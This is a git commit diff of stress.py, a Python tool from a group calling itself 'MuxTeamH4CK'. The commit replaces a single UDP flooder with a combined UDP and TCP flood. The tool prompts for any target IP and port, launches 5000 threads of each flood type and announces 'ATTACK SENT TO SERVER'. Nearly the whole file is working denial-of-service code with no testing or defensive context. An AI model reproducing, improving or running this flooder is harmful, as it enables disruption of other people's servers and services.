4319f2796ae71b0b41043e13cbc646d9966a965c
MuxTeam <minegamer30k@gmail.com>
2026-02-26 00:19:42 +0200

    BOT

--- stress.py
+++ stress.py
@@ -1,37 +1,51 @@
-print ("\033[92m")
-import socket
 import time
 import os
-import random
+import socket
 import threading
-import sys
 
-# Coding MuxTeamH4CK
-# Attack
-def attack(ip, port):
+def udpflood(ip, port):
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  raw = os.urandom(1500)
+  payload = b'\xfe' + raw
   while True:
-    len = random.randint(256, 512)
-    payload = os.urandom(len)
     s.sendto(payload, (ip, port))
-# VPS
+
+def tcpflood(ip, port):
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  raw = os.urandom(1500)
+  while True:
+    s.connect((ip, port))
+    s.send(raw)
+    time.sleep(0)
+    s.close()
+os.system("clear")
 os.system("pyfiglet --color=RED MuxTeamH4CK")
-print("\033[92m")
-print("Owner: ItzMuxGamer")
+print("\033[1;34m")
+print("Teams: EnderBob x ItzMuxGamer")
 print(" ")
 time.sleep(0)
-ip = input("IP: ")
-port = int(input("Port: "))
-print(f"Server Connect: {ip} {port}")
-time.sleep(3)
+ip = input("IP Address: ")
+port = int(input("Port Address: "))
+time.sleep(0)
 os.system("clear")
 os.system("pyfiglet --color=RED MuxTeamH4CK")
 print(" ")
-print(f"Running Packets > {ip} : {port}")
-# Start Attack
+print("Successfully ATTACK SENT TO SERVER!")
+print(" ")
+print("\033[33m=====================")
+print(" ")
+print(f"\033[31mIP Address: {ip}")
+print(f"\033[31mPort Address: {port}")
+print("Stopped Attack: CTRL + Z")
+print(" ")
+print("\033[33m=====================")
 
-for i in range(500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
-  t = threading.Thread(target=attack,args=(ip, port), daemon=True)
+for i in range(5000):
+  t = threading.Thread(target=udpflood,args=(ip, port), daemon=True)
   t.start()
+for i in range(5000):
+  t2 = threading.Thread(target=tcpflood,args=(ip, port), daemon=True)
+  t2.start()
+
 while True:
   time.sleep(0)
